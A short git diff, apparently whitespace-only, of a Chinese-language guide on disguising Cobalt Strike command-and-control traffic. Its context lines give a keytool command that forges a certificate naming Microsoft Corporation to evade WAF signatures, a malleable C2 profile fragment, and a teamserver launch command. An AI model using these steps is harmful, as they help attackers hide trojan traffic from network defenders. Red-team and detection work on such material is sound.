@@ -71,7 +71,7 @@ Cobalt Strike默认证书中含有与cs相关的特征，已经被waf厂商标�
 `keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname "CN=Microsoft Windows, OU=MOPR, O=Microsoft Corporation, L=Redmond, ST=Washington, C=US`   
 
 ##### C2profile混淆流量:   
-https://github.com/threatexpress/malleable-c2
+https://github.com/threatexpress/malleable-c2   
 编辑c2.profile的内容如下，可自由修改部分内容:`vim c2.profile`    
         http-get {
             set uri "/image/";
@@ -128,8 +128,8 @@ https://github.com/threatexpress/malleable-c2
             }
         }
 
-然后使用c2profile方式启动teamserver
-        sudo ./teamserver 192.168.2.96 passwd332 c2profile
+然后使用c2profile方式启动teamserver   
+        sudo ./teamserver 192.168.2.96 passwd332 c2profile   
 
 开启CS的监听，触发木马   
 使用wireshark抓取数据包，查看流量特征是否被混淆   
